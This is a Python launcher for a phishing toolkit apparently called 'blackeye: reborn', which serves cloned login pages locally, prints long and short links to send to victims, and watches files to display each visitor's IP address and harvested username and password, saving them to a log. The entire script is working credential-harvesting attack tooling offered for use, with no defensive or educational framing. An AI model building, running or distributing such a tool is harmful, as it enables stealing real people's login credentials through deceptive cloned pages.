#!/usr/bin/env python3

from .gophish import Phishing
from colorama import Fore, Style
import os.path
import pkg_resources
from pyfiglet import figlet_format
import socket
import sys
from time import sleep
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class MyHandler(FileSystemEventHandler):
	def on_created(self, event):

		if event.src_path.split('/')[-1] == 'ip.txt':
			client_data = start.connections
			ip = client_data[0]
			print(f"\n{Fore.YELLOW}[*]{Fore.BLUE} A new client is live on the clone page!\n")
			print(f"{Fore.YELLOW}Clients ip: {Fore.GREEN}{ip}")
			print(f"\n{Fore.YELLOW}[*]{Fore.BLUE} Watching for credentials to harvest")
		elif event.src_path.split('/')[-1] == 'usernames.txt':
			credential_data = start.credentials
			username = credential_data[0].strip('\n').split()[1]
			password = credential_data[0].strip('\n').split()[3] 
			for repeat in range(2):
					print("\033[A                                                           \033[A")
			print(f"\n{Fore.GREEN}[*]{Fore.BLUE} Credentials recieved saved to {Fore.GREEN}{pkg_resources.resource_filename(__name__, f'res/logs/harvests.log')} \n")
			print(f"{Fore.YELLOW}Username = {Fore.GREEN}{username}\n")
			print(f"{Fore.YELLOW}Password = {Fore.GREEN}{password}")
			print(f"\n{Fore.YELLOW}[*]{Fore.BLUE} Watching for credentials to harvest")


def main():
	# Ascii art
	banner = figlet_format('gophish', font='crawford')
	print(Fore.BLUE,banner,Fore.RESET)
	print(f'{Fore.YELLOW}blackeye: {Fore.BLUE}reborn   {Fore.YELLOW}Author: {Fore.BLUE}graylagx2\n')
	global start
	start = Phishing()
	start.start_server()

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	result = sock.connect_ex(('127.0.0.1', 3333))
	if result == 0:
		link = start.get_link
		print(f"\n{Fore.YELLOW}[*] {Fore.BLUE}Long url to send clients: {Fore.GREEN}{link[0]}")
		print(f"\n{Fore.YELLOW}[*] {Fore.BLUE}Short url to send clients: {Fore.GREEN}{link[1]}")
		template_dir = pkg_resources.resource_filename(__name__, f'res/templates/{start.template}')
		event_handler = MyHandler()
		observer = Observer()
		observer.schedule(event_handler, path=f"{template_dir}/", recursive=False)

		observer.start()
		print(f"\n{Fore.YELLOW}[*] {Fore.BLUE}Watching for new clients...")

		try:
		    while True:
		        sleep(1)
		except KeyboardInterrupt:
		    observer.stop()
		start.kill_server()
		observer.join()
	else:
		start.kill_server()
		sys.exit(f"{fore.RED}[ Error ] Something went wrong the server is not running")


if __name__ == "__main__":
	main()

